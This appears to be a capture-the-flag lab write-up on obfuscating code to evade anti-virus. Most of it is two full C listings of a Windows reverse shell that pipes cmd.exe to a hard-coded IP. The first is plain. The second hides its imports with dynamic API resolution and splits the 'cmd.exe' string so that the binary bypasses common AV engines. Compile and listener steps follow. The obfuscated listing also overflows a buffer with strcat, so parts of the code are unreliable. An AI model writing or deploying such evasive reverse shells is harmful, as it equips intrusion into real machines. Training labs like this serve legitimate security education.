# Real world challenge

No one method will be 100% effective or reliable. To create a more effective and reliable methodology, combine 
the methods.

* When determining in what order to begin obfuscation, consider the impact of each method. For example, is it easier 
to obfuscate an already broken class or is it easier to break a class that is obfuscated?
* In general, run automated obfuscation or less specific obfuscation methods after specific signature breaking.

## Lab

```text
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024

void RunShell(char* C2Server, int C2Port) {
        SOCKET mySocket;
        struct sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
        } else {
            printf("Connected to %s:%d\\n", C2Server, C2Port);

            char Process[] = "cmd.exe";
            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
            CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

            printf("Process Created %lu\\n", pinfo.dwProcessId);

            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        RunShell(argv[1], port);
    }
    else {
        char host[] = "10.10.10.10";
        int port = 53;
        RunShell(host, port);
    }
    return 0;
} 
```

Modify the binary to meet these specifications:

* No suspicious library calls present
* No leaked function or variable names
* File hash is different from the original hash
* Binary bypasses common anti-virus engines

It is also essential to change the C2Server and C2Port variables in the provided payload or this challenge will not 
properly work, and you will not receive a shell back. 

## Obfuscation order

* Rewrite `int WSAAPI WSAConnect` to meet the requirements of a structure definition.
  * Import the `LoadLibraryW` library the calls are stored in.
  * Obtain the pointer to the address.
  * Change all occurrences of the API call with the new pointer.
* Define all pointer addresses needed, corresponding to the structures.
* The structure definitions outside any function at the beginning of the code. 
* The pointer definitions at the top of the `RunShell` function

## Obfuscated code

```text
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 1024


typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
typedef unsigned(WSAAPI* INET_ADDR)(const char *cp);
typedef u_short(WSAAPI* HTONS)(u_short hostshort);
typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
typedef int(WSAAPI* CLOSESOCKET)(SOCKET s);
typedef int(WSAAPI* WSACLEANUP)(void);

void Run(char* Server, int Port) {

HMODULE hws2_32 = LoadLibraryW(L"ws2_32");
WSASTARTUP myWSAStartup = (WSASTARTUP) GetProcAddress(hws2_32, "WSAStartup");
WSASOCKETA myWSASocketA = (WSASOCKETA) GetProcAddress(hws2_32, "WSASocketA");
INET_ADDR myinet_addr = (INET_ADDR) GetProcAddress(hws2_32, "inet_addr");
HTONS myhtons = (HTONS) GetProcAddress(hws2_32, "htons");
WSACONNECT myWSAConnect = (WSACONNECT) GetProcAddress(hws2_32, "WSAConnect");
CLOSESOCKET myclosesocket = (CLOSESOCKET) GetProcAddress(hws2_32, "closesocket");
WSACLEANUP myWSACleanup = (WSACLEANUP) GetProcAddress(hws2_32, "WSACleanup");

        SOCKET s12;
        struct sockaddr_in addr;
        WSADATA version;
        myWSAStartup(MAKEWORD(2,2), &version);
        s12 = myWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = myinet_addr(Server);
        addr.sin_port = myhtons(Port);

        if (myWSAConnect(s12, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
            myclosesocket(s12);
            myWSACleanup();
        } else {


            char P1[] = "cm";
            char P2[] = "d.exe";
            char* P = strcat(P1, P2);

            STARTUPINFO sinfo;
            PROCESS_INFORMATION pinfo;
            memset(&sinfo, 0, sizeof(sinfo));
            sinfo.cb = sizeof(sinfo);
            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) s12;
            CreateProcess(NULL, P, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);


            WaitForSingleObject(pinfo.hProcess, INFINITE);
            CloseHandle(pinfo.hProcess);
            CloseHandle(pinfo.hThread);
        }
}

int main(int argc, char **argv) {
    if (argc == 3) {
        int port  = atoi(argv[2]);
        Run(argv[1], port);
    }
    else {
        char host[] = "10.10.50.26";
        int port = 1234;
        Run(host, port);
    }
    return 0;
}
```

Compile the binary using `mingw-gcc`.

    x86_64-w64-mingw32-gcc challenge.c -o challenge.exe -lwsock32 -lws2_32 

Start a listener. Receive shell. Flag is on Administrator's Desktop.
